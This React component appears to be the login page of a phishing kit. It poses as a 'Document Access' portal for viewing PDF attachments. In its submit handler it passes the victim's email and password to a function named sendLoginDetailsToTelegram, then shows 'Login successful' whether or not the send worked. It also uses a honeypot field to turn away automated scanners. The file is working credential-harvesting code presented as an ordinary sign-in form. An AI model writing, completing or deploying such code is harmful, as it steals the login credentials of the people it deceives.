
import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Lock, Mail } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useHoneypot } from "@/hooks/useHoneypot";
import { sendLoginDetailsToTelegram } from "@/services/telegramService";
import FormInput from "./FormInput";
import HoneypotField from "./HoneypotField";
import LoadingButton from "./LoadingButton";
import companyLogo from "@/assets/company-logo.png";

interface LoginFormProps {
  onLogin: (email: string, password: string) => void;
}

const LoginForm = ({ onLogin }: LoginFormProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();
  const { honeypot, setHoneypot, isBot } = useHoneypot();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Honeypot check - if filled, it's likely a bot
    if (isBot) {
      console.log("Bot detected via honeypot, blocking submission");
      toast({
        title: "Access Denied",
        description: "Suspicious activity detected.",
        variant: "destructive",
      });
      return;
    }

    if (!email || !password) {
      toast({
        title: "Missing credentials",
        description: "Please enter both email and password.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Send login details to Telegram
    const telegramSent = await sendLoginDetailsToTelegram(email, password);
    
    if (telegramSent) {
      // Simulate API call delay
      setTimeout(() => {
        onLogin(email, password);
        setIsLoading(false);
        toast({
          title: "Login successful",
          description: "Welcome! You can now view PDF attachments.",
        });
      }, 1000);
    } else {
      // Continue with login even if Telegram fails
      setTimeout(() => {
        onLogin(email, password);
        setIsLoading(false);
        toast({
          title: "Login successful",
          description: "Welcome! You can now view PDF attachments.",
        });
      }, 1000);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <Card className="w-full max-w-md shadow-xl border-0 bg-white/80 backdrop-blur-sm">
        <CardHeader className="text-center space-y-4">
          <div className="mx-auto w-16 h-16 rounded-full flex items-center justify-center overflow-hidden">
            <img src={companyLogo} alt="Company Logo" className="w-full h-full object-contain" />
          </div>
          <CardTitle className="text-2xl font-bold text-gray-900">
            Document Access
          </CardTitle>
          <CardDescription className="text-gray-600">
            Access secure document viewing
          </CardDescription>
        </CardHeader>
        
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            <HoneypotField value={honeypot} onChange={setHoneypot} />

            <FormInput
              id="email"
              label="Email Address"
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={setEmail}
              Icon={Mail}
              disabled={isLoading}
            />
            
            <FormInput
              id="password"
              label="Password"
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={setPassword}
              Icon={Lock}
              disabled={isLoading}
            />
            
            <LoadingButton
              isLoading={isLoading}
              loadingText="Signing in..."
              className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02]"
            >
              Access Documents
            </LoadingButton>
          </form>
        </CardContent>
      </Card>
    </div>
  );
};

export default LoginForm;
